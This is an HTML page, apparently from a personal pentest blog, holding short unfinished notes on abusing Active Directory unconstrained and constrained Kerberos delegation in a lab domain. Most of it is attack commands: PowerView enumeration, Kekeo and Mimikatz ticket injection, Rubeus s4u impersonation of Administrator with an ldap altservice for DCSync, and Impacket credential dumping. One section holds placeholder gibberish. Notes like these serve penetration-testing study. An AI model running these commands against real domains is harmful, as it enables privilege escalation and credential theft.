@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="test">
+  <meta property="og:description" content="test">
+  
+  <meta property="og:image" content="https://ferreirasc.github.io/post/ad_notes/">
+  <meta property="og:image:type" content="image/jpg">
+  
+  <meta property="og:type" content="article">
+  <meta property="article:author" content="Davi Frossard">
+  
+  <meta property="article:published_time" content="2020-05-29 02:22:20 -0400 -0400">
+  <meta property="fb:app_id" content="128539894229266"/>
+  <meta property="fb:admins" content="1234176778"/>
+  <meta name="generator" content="Hugo 0.53" />
+
+  <title>Active Directory Notes &middot; Leonardo Ferreira</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+  
+  <link rel="shortcut icon" href="https://ferreirasc.github.ioimg/favicon.ico" type="image/x-icon" />
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+  
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\[','\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { 
+          equationNumbers: { autoNumber: "AMS" },
+          extensions: ["AMSmath.js", "AMSsymbols.js"] 
+      }
+    },
+    TeX: {
+      equationNumbers: { autoNumber: "AMS" } 
+    }
+});
+  MathJax.Hub.Queue(function() {
+  
+  
+  
+  var all = MathJax.Hub.getAllJax(), i;
+  for(i = 0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script>
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="https://ferreirasc.github.io/"> ferreirasc:~#</a>
+
+
+
+<a class="pure-menu-heading brand" href="https://ferreirasc.github.io/about"><img class="avatar" src="https://ferreirasc.github.io/avatar.jpg"/></a>
+
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/about/"><i class='fa fa-user fa-fw'></i>About Me</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/ferreirasc0" target="_blank"><i class="fa fa-twitter-square fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/ferreirasc" target="_blank"><i class="fa fa-facebook-square fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/ferreirasc" target="_blank"><i class="fa fa-linkedin-square fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/ferreirasc" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Active Directory Notes</h1>
+  <h2>test</h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>28 May 2020, 00:30</time>
+  </div>
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://ferreirasc.github.iotopics/notes">Notes</a>
+    
+  </div>
+  
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.iotags/pentest">pentest</a>
+    
+  </div>
+  
+  
+  
+  
+  
+  <div>
+    <i class="fa fa-signal fa-fw"></i>
+      <a class="post-taxonomy-level" href="https://ferreirasc.github.iolevel/basic">Basic</a>
+  </div>
+  
+  
+
+</div>
+
+
+  
+
+<h1 id="ad-delegation">AD Delegation</h1>
+
+<hr />
+
+<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
+
+<h3 id="finding-computers-users-with-unconstrained-delegation">Finding computers/users with unconstrained delegation:</h3>
+
+<ul>
+<li>AD Module</li>
+</ul>
+
+<pre><code class="language-python">Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+</code></pre>
+
+<ul>
+<li>Powerview</li>
+</ul>
+
+<pre><code class="language-python">Import-Module .\PowerView.ps1
+Get-NetComputer -Unconstrained
+Get-NetUser -Unconstrained
+</code></pre>
+
+<h3 id="exploiting-from-a-windows-box">Exploiting (from a Windows box)</h3>
+
+<p>daskdalkas</p>
+
+<hr />
+
+<h2 id="constrained-delegation">Constrained Delegation</h2>
+
+<h3 id="finding-computers-users-with-constrained-delegation">Finding computers/users with constrained delegation</h3>
+
+<pre><code class="language-python">. .\PowerView.ps1
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+</code></pre>
+
+<h3 id="exploiting-from-a-windows-box-1">Exploiting (from a Windows box)</h3>
+
+<p>Ask a TGT to impersonate the user allowed to delegate privs firstly (lab.local\sqlservice) and then request a s4u (s4u2self + s4u2proxy) on behalf of a high privileged user (lab.local\Administrator).</p>
+
+<ul>
+<li>Kekeo + Mimikatz</li>
+</ul>
+
+<pre><code class="language-python">.\kekeo.exe
+tgt::ask /user:sqlservice /password:&lt;PASS&gt; /domain:lab.local
+tgs::s4u /tgt:TGT_sqlservice@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:cifs/DC01LAB.lab.local
+exit
+</code></pre>
+
+<p>Use mimikatz to inject this ticket in-memory:</p>
+
+<pre><code class="language-python">Invoke-Mimikatz -Command '&quot;kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_cifs~DC01LAB.lab.local@LAB.LOCAL.kirbi&quot;'
+</code></pre>
+
+<p>Check <code>klist</code> to verify that everything went well.</p>
+
+<ul>
+<li>Rubeus</li>
+</ul>
+
+<p>As sqlservice has &ldquo;CIFS/DC01LAB.lab.local&rdquo; set on your <strong>msDS-AllowedToDelegateTo</strong> property, it would be possible to consider another service available for this same computer, such as ldap (in a DC, it would allow DCSync). The <code>/altservice</code> parameter do the work!</p>
+
+<pre><code class="language-python">Rubeus.exe asktgt /user:sqlservice /domain:lab.local /rc4:&lt;NTLM_hash&gt; /outfile:tgt.kirbi
+Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/DC01LAB.lab.local /altservice:ldap /ptt
+</code></pre>
+
+<p>Or all-in-one command:</p>
+
+<pre><code class="language-python">Rubeus.exe s4u /user:sqlservice /domain:lab.local /rc4:&lt;NTLM_hash&gt; /impersonateuser:Administrator /msdsspn:cifs/DC01LAB.lab.local /ptt
+</code></pre>
+
+<h3 id="exploiting-from-a-linux-box">Exploiting (from a Linux box)</h3>
+
+<ul>
+<li>Impacket</li>
+</ul>
+
+<pre><code class="language-python">getST.py -spn cifs/DC01LAB.lab.local -impersonate Administrator lab.local/sqlservice:'&lt;PASS&gt;'
+export KRB5CCNAME=Administrator.ccache
+</code></pre>
+
+<p>Having access to CIFS&hellip; we can dump SAM database.</p>
+
+<p><code>secretsdump.py -k -no-pass DC01LAB.lab.local</code></p>
+
+
+<hr><br>
+  
+  
+  <small><i class="fa fa-lightbulb-o" aria-hidden="true"></i> Last modified: May 29, 2020</small>  
+</hr>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+  </div>
+</div>
+
+
+  
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'ferreirasc';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="https://ferreirasc.github.iojs/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-77924066-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
